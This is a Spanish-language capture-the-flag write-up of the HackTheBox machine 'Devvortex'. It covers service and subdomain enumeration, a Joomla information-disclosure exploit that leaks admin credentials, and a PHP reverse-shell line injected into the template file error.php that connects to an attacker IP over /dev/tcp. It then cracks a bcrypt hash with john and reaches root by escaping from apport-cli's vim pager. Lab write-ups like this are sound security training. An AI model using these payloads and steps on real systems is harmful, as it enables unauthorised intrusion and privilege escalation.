---
title: HackTheBox-Devvortex Easy
published: true
---
Esta es una máquina fácil de la plataforma de HackTheBox, en la cual vamos a obtener **RCE** a través de la explotación de el CMS **Joomla**.
Crackearemos una contraseña en hash **bcrypt** para escalar privilegios, y ganaremos acceso root gracias a la capacidad de ejecutar el binario **apport-cli** 
con privilegio de superusuario.

# Reconocimiento
Empezamos realizando un escaneo de puertos con el comando: 
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.242 -oN puertos
```
![puertos](https://github.com/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/puertos.png)

Los puertos abiertos son:
- 22
- 80

Una vez que sabemos los puertos, hacemos otro escaneo para ver los servicios que corren en los mismos:

```
nmap -p22,80 -sCV 10.10.11.242 -oN services
```
![servicios](https://github.com/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/servicios.png)

Tenemos el puerto 22(ssh) y el 80(http). Lo que significa que hay una página web.
También nos reporta un dominio `http://devvortex.htb`
Inicialmente la página web no tienen nada interesante y tampo es funcional, por lo que vamos a realizar un descubrimiento de directorios:

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://devvortex.htb
```
Desafortunadamente no encontraos ningún directorio importante por lo que, en vez de descubrir directorios, vamos a tratar de descubrir subdominios:

```
wfuzz -c --hc 404 --hw 10 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb'
```
![subdominios](https://github.com/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/subdominio.png)

El subdominio `dev` tiene buena pinta. Parece que es el subdominio de desarrollo de la página web. Si miramos el `wappalyzer`(lo podéis encontrar en [wappalyzer](https://addons.mozilla.org/es/firefox/addon/wappalyzer/)) vemos que está utilizando Joomla.
Joomla es un **CMS** (Content Management System) que suele ser usado en desarrollo web.
Si miramos en el archivo **robots.txt** vemos que hay una ruta /administrator, en la cual hay un panel de login.

![robotstxt](https://github.com/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/robotstxt.png)

![login](https://github.com/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/login.png)

Para tratar de enumerar la versión de Joomla vamos a usar la herraamienta **droopescan**.

![droopescan](https://github.com/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/droopescan.png)

La propia herramienta no logra encontrar la versión de joomla pero, nos pasa un archivo que podría contener información importante: **/administrator/manifests/files/joomla.xml**
En este archivo si que vemos la versión de joomla:

![joomlaxml](https://github.com/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/joomlaxml.png)

Parece ser que la versión del CMS es la 4.2.6, la cual tiene una vulnerabilidad de Information Disclousure.

# Joomla Information Disclousure
Para explotar esta vulnerabilidad vamos a usar [el exploit de Acceis](https://github.com/Acceis/exploit-CVE-2023-23752). 
Este exploit nos reporta el usuario y contraseña del panel de login que hemos encontrado:

![info](https://github/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/exploit.png)

Con estas credenciales accedemos al panel de administración de Joomla.
Ahora, vamos a obtener **RCE** a la máquina mediante la inyección de código php malicioso en uno de los archivos del template de Joomla:

# Joomla RCE modificando template
Dentro de la interfaz, tenemos que dirigirnos a **System -> Administrator Templates -> Atum Details and Files -> error.php** como se muestra en las siguientes imágenes:

![php1](https://github/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/php1.png)

![php2](https://github/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/php2.png)

![php3](https://github/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/php3.png)

![php4](https://github/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/php4.png)

Una vez estemos en el archivo **error.php**, introducimos el siguiente código php:

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/nuestraip/puerto 0>&1'");
```
Llegados a este punto, simplemente nos ponemos en escucha con netcat por el puerto que hayamos puesto en el php(en este caso el 443):

```
nc -nlvp 443
```
y realizamos una petición al archivo error.php, ya sea por `curl` o mediante el navegador.

Con esto ya tenemos ejecución remota de comandos. Pero antes de pasar a la escalada, vamos a convertir la consola en una shell completamente interactiva:

```
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```
Ahora sí, pasamos a la escalada.

# Escalada de privilegios
Para empezar, como tenemos las credenciales de la base de datos SQL vamos a conectarnos a ella mediante la terminal:

```
mysql -u lewis -p
contraseña
show databases;
use joomla;
select * from sd4fg_users;
```
Con esto vemos la contraseña encriptada del usuario logan:

![hash](https://github.com/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/hash.png)

Parece que el hash es `bcrypt`, así que vamos a tratar de crackearlo con john mediante fuerza bruta:

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Al hacer esto obtenemos la contraseña en texto claro, que es `tequieromucho`.

Llegados a este punto, ya solo queda convertirnos en usuario root.

# Pwned!

Vamos a empezar ejecutando **sudo -l** para ver si hay algún binario que podamos ejecutar con privilegio root.
Hay uno, `/usr/bin/apport-cli`.
Este binario lo vamos a ejecutar con el siguiente comando:
```
sudo /usr/bin/apport-cli -f 
```
Al ejecutar el binario, hay una serie de inputs en los que tenemos que seleccionar una opción.

En el primer input seleccionamos la primera opción, después la segunda opción, y finalmente seleccionamos **V(View Report)**. Al seleccionar esta última opción abre una terminal de `vim`.

Llegados a este punto, en la terminal de vim escribimos **!/bin/bash**, como se ve en la imagen:

![bin4](https://github.com/UpanaH4ck/upanah4ck.github.io/tree/master/assets/devvortex/bin4.png)

Ahora simplemente con presionar la tecla **Intro**, ya tenemos una consola como `superusuario`

